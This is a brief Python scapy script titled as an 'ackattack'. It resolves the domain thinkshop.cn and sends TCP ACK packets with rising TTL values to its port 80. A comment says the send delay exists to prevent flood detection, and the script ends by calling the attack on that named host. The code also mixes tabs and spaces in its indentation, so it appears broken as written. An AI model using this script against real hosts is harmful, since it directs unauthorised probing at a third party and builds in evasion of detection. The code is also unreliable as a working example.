import time as timefuck
from scapy.all import *
import socket
import logging

# Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def ackattack(host):
	ipaddr = socket.gethostbyname(host)
	port = RandNum(1024,65535)

        for time in range(0,255):
                ack = IP(dst=ipaddr, ttl=time)/TCP(sport=port, dport=80, flags="A")
                send(ack)
		
		# Prevent flood detection
		timefuck.sleep(0.1)

ackattack("thinkshop.cn")
